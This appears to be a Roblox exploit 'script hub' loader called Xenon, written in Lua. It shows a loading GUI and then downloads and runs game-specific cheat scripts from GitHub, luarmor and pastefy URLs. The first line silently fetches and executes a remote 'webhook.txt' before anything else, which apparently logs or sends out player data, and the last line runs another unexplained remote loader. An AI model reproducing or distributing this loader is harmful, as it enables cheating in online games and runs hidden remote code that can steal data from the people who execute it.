loadstring(game:HttpGet('https://raw.githubusercontent.com/dkhub43221/scripts/refs/heads/main/webhook.txt'))()

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")
local StarterGui = game:GetService("StarterGui")
local player = Players.LocalPlayer

local AllowedGames = {
    [102500767640476] = "https://raw.githubusercontent.com/dkhub43221/scripts/refs/heads/main/miami%20streets", -- miami streets out dated
    [18642421777] = "https://api.luarmor.net/files/v4/loaders/281b31dce8d9eac84ac6e98a22afd120.lua", -- tha bronx 3 main server
    [16472538603] = "https://api.luarmor.net/files/v4/loaders/281b31dce8d9eac84ac6e98a22afd120.lua", -- tha bronx 3 vc server
    [11177482306] = "https://pastefy.app/NqZMNkm1/raw", -- streetz warz 2
    [130700367963690] = "https://pastefy.app/ejleWv6P/raw", -- philly streetz 2 i think lol
    [12077443856] = "https://pastefy.app/SXyIeokT/raw", -- calishoot out
    [97555694718912] = "https://pastefy.app/gRTAFzUV/raw" -- bronx: duels
}

local gui = Instance.new("ScreenGui")
gui.Name = "Xenon_HUB_GUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local blur = Instance.new("BlurEffect")
blur.Size = 0
blur.Parent = Lighting
TweenService:Create(blur, TweenInfo.new(0.5), {Size = 24}):Play()

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 360, 0, 180)
frame.Position = UDim2.new(0.5, -180, 0.5, -90)
frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
frame.BorderSizePixel = 0
frame.Parent = gui

local outline = Instance.new("UIStroke")
outline.Thickness = 3
outline.Color = Color3.fromRGB(0, 255, 0)
outline.Parent = frame

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 8)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.fromRGB(0, 255, 0)
title.TextScaled = true
title.Font = Enum.Font.GothamBold
title.Parent = frame

local prem = Instance.new("TextLabel")
prem.Size = UDim2.new(1, -20, 0, 20)
prem.Position = UDim2.new(0, 10, 0, 45)
prem.BackgroundTransparency = 1
prem.Text = "Loading script automatically..."
prem.TextColor3 = Color3.fromRGB(255, 255, 255)
prem.TextSize = 14
prem.Font = Enum.Font.GothamSemibold
prem.Parent = frame

local function typeTitle(t, s)
    s = s or 0.1
    title.Text = ""
    for i = 1, #t do
        title.Text = t:sub(1, i)
        task.wait(s)
    end
end

task.spawn(function()
    while gui.Parent do
        typeTitle("Xenon")
        task.wait(0.5)
        title.Text = ""
        task.wait(0.5)
    end
end)

local close = Instance.new("TextButton")
close.Size = UDim2.new(0, 30, 0, 30)
close.Position = UDim2.new(1, -35, 0, 5)
close.BackgroundTransparency = 1
close.Text = "X"
close.TextColor3 = Color3.fromRGB(255, 255, 255)
close.TextScaled = true
close.Font = Enum.Font.GothamBold
close.Parent = frame
close.MouseButton1Click:Connect(function()
    gui:Destroy()
    blur:Destroy()
end)

-- Auto-load: no key system, load script directly after short delay
task.spawn(function()
    task.wait(2)

    local scriptUrl = AllowedGames[game.PlaceId]

    if scriptUrl then
        StarterGui:SetCore("SendNotification", {
            Title = "Xenon",
            Text = "Loading script...",
            Duration = 3
        })
        gui:Destroy()
        blur:Destroy()
        loadstring(game:HttpGet(scriptUrl))()
    else
        StarterGui:SetCore("SendNotification", {
            Title = "Xenon",
            Text = "This script cannot run here.",
            Duration = 4
        })
    end
end)

-- Also load the pastefy script
loadstring(game:HttpGet("https://pastefy.app/rCChzMPK/raw?part=Loader"))()
